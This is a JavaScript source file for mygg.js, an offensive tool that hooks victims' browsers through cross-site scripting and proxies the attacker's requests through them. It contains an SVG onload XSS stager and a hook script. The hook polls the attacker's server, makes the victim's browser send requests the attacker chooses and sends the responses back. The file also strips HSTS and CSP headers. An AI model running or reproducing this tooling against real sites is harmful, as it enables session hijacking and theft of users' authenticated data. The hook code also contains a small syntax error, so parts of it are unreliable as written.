/* --------- Info --------- */

//  mygg.js v0.3.3
//  Author: Daniel Solstad
//  Repository: https://github.com/dsolstad/mygg.js


/* --------- Configuration --------- */

// The only thing you really need to change is the domain parameter.
// If you don't have a domain, change domain to the ipaddr of the server hosting mygg.js.
// If mygg is running on a remote server, either leave proxy_interface at 127.0.0.1 and use ssh+portforwarding,
// or bind it to 0.0.0.0 and put your remote addr in proxy_allowed_ips. 

const config = {
    domain: 'example.com',
    http_interface: '0.0.0.0',
    https_interface: '0.0.0.0',
    http_port: 80,
    https_port: 443,
    polling_time: 2000,
    key: './key.pem',
    cert: './cert.pem',
    debug: 0,
    proxy_interface: '127.0.0.1',
    proxy_port: 8081,
    proxy_allowed_ips: ['127.0.0.1'],
}

/* --------- Requires --------- */

const http = require('http');
const https = require('https');
const proxy = require('http');
const fs = require('fs');
const Busboy = require('busboy');
const { spawn } = require('child_process');

/* --------- Global variables --------- */

var tasks_pending = [];
var task_callbacks = {};
var task_counter = 0;

/* --------- The HTTP proxy server that the attacker uses --------- */

proxy.createServer(function (req, res) {
    /* Checks if the client is allowed. */
    var client_ipaddr = req.connection.remoteAddress;
    if (config.proxy_allowed_ips.indexOf(client_ipaddr) === -1) {
        console.log(`[+] Denied client ${client_ipaddr} to connect to proxy`);
        res.writeHead(403);
        res.end();
        return;
    }

    console.log(`[+] Whitelisted client ${client_ipaddr} connected to proxy`);
    console.log(`[+] Requesting: ${req.method} ${req.url}`);
    
    /* Get the full requested URL. */
    /*var urlObj = new URL(req.url);
    var url = urlObj.pathname;
    if (urlObj.searchParams != '') {
        url = url + '?' + urlObj.searchParams;
    }*/
    
    /* Check if request from proxy/attacker contains a body. */
    if (req.headers['content-length'] > 0) {
        var data = [];
        req.on('data', function (chunk) {
            data.push(chunk);
        });
        req.on('end', function () {
            /* Sends a task to the hooked browser. */
            var buffer = Buffer.concat(data);
            var body = buffer.toString('utf8');
            var new_task = {"id": task_counter++, "method": req.method, "url": req.url, "head": req.headers, "body": body}
            tasks_pending.push(new_task);
            
            /* Handles the response from the task given to the hooked browser. */
            task_callbacks[new_task.id] = function (result) {
                var headers = result.headers;
                var headers = str2json(headers);
                var headers = stripHeaders(headers);
                var content_type = (headers['content-type']? headers['content-type'] : 'plain/text');

                /* If the received content type is binary, we need to present it as such.
                   If is it text, we need to process it before being displayed in the attacking browser. */
                if (content_type.match(/image|octet-stream/)) {
                    var body = result.body;
                } else {
                    var body = result.body.toString('utf8');
                    var body = stripHooks(body);
                    var body = https2http(body);
                }

                var body_length = body.length;
                var headers = updateContentLength(headers, body_length);

	            console.log("[+] Received status: " + result.status);
	            if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
	            if (config.debug) { console.log("[+] Received body:\n" + body); }
	            console.log("[+] -------------------------------- [+]");

                res.writeHead(result.status, headers);
                res.end(body);
            };
        });
    } else {
        /* Sends a task to the hooked browser. */
        var new_task = {"id": task_counter++, "method": req.method, "url": req.url, "head": req.headers, "body": null}
        tasks_pending.push(new_task);
    
        /* Handles the response from the task given to the hooked browser. */
        task_callbacks[new_task.id] = function (result) {
            var headers = result.headers;
            var headers = str2json(headers);
            var headers = stripHeaders(headers);
            var content_type = (headers['content-type']? headers['content-type'] : 'plain/text');

            /* If the received content type is binary, we need to present it as such.
               If is it text, we need to process it before being displayed in the attacking browser. */
            if (content_type.match(/image|octet-stream/)) {
                var body = result.body;
            } else {
                var body = result.body.toString('utf8');
                var body = stripHooks(body);
                var body = https2http(body);
            }

            var body_length = body.length;
            var headers = updateContentLength(headers, body_length);

	        console.log("[+] Received status: " + result.status);
	        if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
	        if (config.debug) { console.log("[+] Received body:\n" + body); }
	        console.log("[+] -------------------------------- [+]");

            res.writeHead(result.status, headers);
            res.end(body);
        };
    }

}).listen(config.proxy_port, config.proxy_interface, function (err) {
    if (err) return console.error(err)
    var info = this.address()
    console.log(`[+] Proxy server listening on address ${info.address} port ${info.port}`)
});


/* --------- HTTP and HTTPS server for serving hook.js, polling and receiving requests --------- */

http_handler = function(req, res) {
    var ipaddr = req.connection.remoteAddress;
    var useragent = req.headers['user-agent'];
    var referer = req.headers['referer'];
    /* Serves the hook file */
    if (req.url == '/hook.js') {
        res.writeHead(200, {"Content-Type": "application/javascript"});
        res.end(hook_file);
        console.log("[+] Hooked new browser [" + ipaddr + "][" + useragent + '][' + referer + ']');
    /* Hooked browser asks mygg if there are any new jobs for it */
    } else if (req.url == '/polling') {
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Headers', '*');
        res.setHeader('Content-Type', 'application/json');

        if (tasks_pending.length > 0) {
            data = JSON.stringify(tasks_pending);
            if (config.debug) { 
                console.log("[+] Tasks pending"); console.log(data); 
                console.log("[+] -------------------------------- [+]");
            }
            res.writeHead(200);
            res.end(data);
            tasks_pending = []
        } else {
            res.writeHead(404)
            res.end();
        }
    /* Catching the performed requests from the hooked browser */
    } else if (req.url == '/responses' && req.method == 'POST') {

        var busboy = new Busboy({ headers: req.headers });
        var response = {};

        busboy.on('file', function(fieldname, file, filename, encoding, mimetype) {
            response[fieldname] = [];
            //console.log('File [' + fieldname + ']: filename: ' + filename + ', encoding: ' + encoding + ', mimetype: ' + mimetype);
            file.on('data', function(data) {
                //console.log('File [' + fieldname + '] got ' + data.length + ' bytes');
                response[fieldname].push(data);
            });
            file.on('end', function() {
                //console.log('File [' + fieldname + '] Finished');
                response[fieldname] = Buffer.concat(response[fieldname]);
            });
        });
        busboy.on('field', function(fieldname, val, fieldnameTruncated, valTruncated, encoding, mimetype) {
            //console.log('Field [' + fieldname + ']: value: ' + inspect(val));
            response[fieldname] = val;
        });
        busboy.on('finish', function() {
            // Runs the callback for the associated request ID
            var handler = task_callbacks[response['id']];
            handler(response);
            res.writeHead(200, { Connection: 'close' });
            res.end();
        });

        req.pipe(busboy);

    } else {
        res.writeHead(404);
        res.end();
    }
};

/* Start HTTP Server */
http.createServer(http_handler).listen(config.http_port, config.http_interface, function(err) {
    if (err) return console.error(err)
    var info = this.address()
    console.log(`[+] HTTP server listening on address ${info.address} port ${info.port}`)
});

/* Generate key and self-signed certificate. */
const shell = spawn('openssl', 'req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj /CN=localhost'.split(" "));

/* Read key and cert before starting HTTPS Server. */
shell.on('close', function (code) {
    https_options = { key: fs.readFileSync(config.key), cert: fs.readFileSync(config.cert) };
    https.createServer(https_options, http_handler).listen(config.https_port, config.https_interface, function(err) {
        if (err) return console.error(err)
        var info = this.address()
        console.log(`[+] HTTPS server listening on address ${info.address} port ${info.port}`)
    });
});


/* --------- Helper functions --------- */

/* Removes unwanted headers, such as HSTS and CSP. */
function stripHeaders(headers) {
    delete headers['strict-transport-security'];
    delete headers['content-security-policy'];
    delete headers['content-encoding'];
    delete headers['content-length'];
    return headers;
}

/* Strips complete URLs with hook.js to "javascript", which will be ignored. */
function stripHooks(body) {
    return body.replace(/src=["']https?:\/\/[^\/]*?\/hook\.js/g, "src='javascript:#");
}

/* Convert links in the body from https to http. */
function https2http(body) {
    return body.toString().replace(/https\:\/\//g, "http://");
}

/* Sets the content-length header. */
function updateContentLength(headers, new_length) {
    headers['Content-Length'] = new_length;
    return headers;
}

/* Converts a string to JSON. */
function str2json(headers) {
    var arr = headers.trim().split(/[\r\n]+/);
    var header_map = {};
    arr.forEach(function (line) {
        var parts = line.split(': ');
        var header = parts.shift().toLowerCase();
        var value = parts.join('');
        header_map[header] = value;
    });
    return header_map;
}


/* --------- Payload stager that downloads mygg --------- */

var hook = `<svg/onload="var x=document.createElement('script');\
x.src='//${config.domain}:${config.https_port}/hook.js';document.head.appendChild(x);">`
console.log("[+] Payload stager:\r\n" + hook + "\r\n");


/* --------- The mygg.js payload --------- */

var hook_file = `
function makeRequest(id, method, url, head, body) {
    /* Forcing the hooked browser to perform the request. */
    var target_http = new XMLHttpRequest();
    target_http.responseType = 'blob';
    target_http.onreadystatechange = function() {

        /* Sending the response back to mygg. */
        if (target_http.readyState == 4) {
            var formData = new FormData();
            formData.append('id', id);
            formData.append('method', method);
            formData.append('url', url);

            /* Ugly hack for old browser's that doesn't support responseURL */
            responseURL = (target_http.responseURL? target_http.responseURL : url);

            /* Checking if the browser got a redirect. */
            if (stripProt(url) == stripProt(responseURL) {
                formData.append('status', target_http.status);
                formData.append('headers', target_http.getAllResponseHeaders());
                var blob = new Blob([target_http.response], {type: 'application/octet-stream'});
                formData.append('body', blob);
            } else {
                /* Need to redirect the attacking browser too. */
                formData.append('status', '301');
                formData.append('headers', "Location: " + target_http.responseURL);
            }
            var mygg_http = new XMLHttpRequest();
            mygg_http.open("POST", "//${config.domain}:" + getPort() + "/responses", true);
            mygg_http.send(formData);
        }
    };
    
    target_http.open(method, url, true);
    //for (var key in head) { target_http.setRequestHeader(key, head[key]) }
    if (body) {
        // Need to add some headers sent from the attacking browser
        target_http.setRequestHeader('content-type', head['content-type']);
        target_http.send(body.trim());
    } else {
        target_http.send();
    }
}
function stripProt(url) {
    return url.split('://').splice(1).join('/');
}
function getPath(url) {
    return '/' + url.split('/').splice(3).join('/');
}
function getPort() {
    var ports = {'http': ${config.http_port}, 'https': ${config.https_port}};
    return ports[location.protocol.slice(0, -1)];
}
function poll() {
    var mygg_http = new XMLHttpRequest();
    mygg_http.onreadystatechange = function () {
        if (mygg_http.readyState == 4 && mygg_http.status == 200) {
            var tasks = JSON.parse(mygg_http.responseText);
            for (var i in tasks){
                console.log("New task"); console.log(tasks[i]);
                makeRequest(tasks[i].id, tasks[i].method, tasks[i].url, tasks[i].head, tasks[i].body);
            }
        }
    };
    mygg_http.open("GET", "//${config.domain}:" + getPort() + "/polling", true);
    mygg_http.send();
    setTimeout(poll, ${config.polling_time});
}
poll();
`;
